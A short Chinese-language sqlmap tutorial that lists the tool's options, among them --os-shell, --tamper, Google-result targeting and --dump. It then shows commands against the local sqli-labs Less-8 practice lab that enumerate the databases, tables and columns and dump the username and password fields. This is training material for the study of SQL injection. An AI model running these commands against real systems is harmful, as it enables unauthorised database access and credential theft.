

sqlmap使用教程

#### 参数

```sql
-u 指定目标URL (可以是http协议也可以是https协议)
-d 连接数据库
--dbs 列出所有的数据库
--current-db 列出当前数据库
--tables 列出当前的表
--columns 列出当前的列
-D 选择使用哪个数据库
-T 选择使用哪个表
-C 选择使用哪个列
--dump 获取字段中的数据
--batch 自动选择
yes--smart 启发式快速判断，节约浪费时间
--forms 尝试使用post注入
-r 加载文件中的HTTP请求（本地保存的请求包txt文件）
-l 加载文件中的HTTP请求（本地保存的请求包日志文件）
-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
-o 开启所有默认性能优化--tamper 调用脚本进行注入
-v 指定sqlmap的回显等级
--delay 设置多久访问一次
--os-shell 获取主机shell，一般不太好用，因为没权限
-m 批量操作-c 指定配置文件，会按照该配置文件执行动作
-data data指定的数据会当做post数据提交
-timeout 设定超时时间
--level 设置注入探测等级
--risk 风险等级
--identify-waf 检测防火墙类型
--param-del="分割符" 设置参数的分割符
--skip-urlencode 不进行url编码
--keep-alive 设置持久连接，加快探测速度
--null-connection 检索没有body响应的内容，多用于盲注
--thread 最大为10 设置多线程
```



less 8

```sql
python sqlmap.py http://localhost/sqli_labs/Less-8/?id=1 -dbs --batch
//查询所有数据库
python sqlmap.py http://localhost/sqli_labs/Less-8/?id=1 --current-db --batch
//查询当前数据库
python sqlmap.py http://localhost/sqli_labs/Less-8/?id=1 -D security --tables --batch
//查询security数据库内所有的表
python sqlmap.py http://localhost/sqli_labs/Less-8/?id=1 -D security -T users --columns --batch
//查询users表内所有的字段名
python sqlmap.py http://localhost/sqli_labs/Less-8/?id=1 -D security -T users -C "username,password" --dump --batch
//查询username和password字段的内容
```
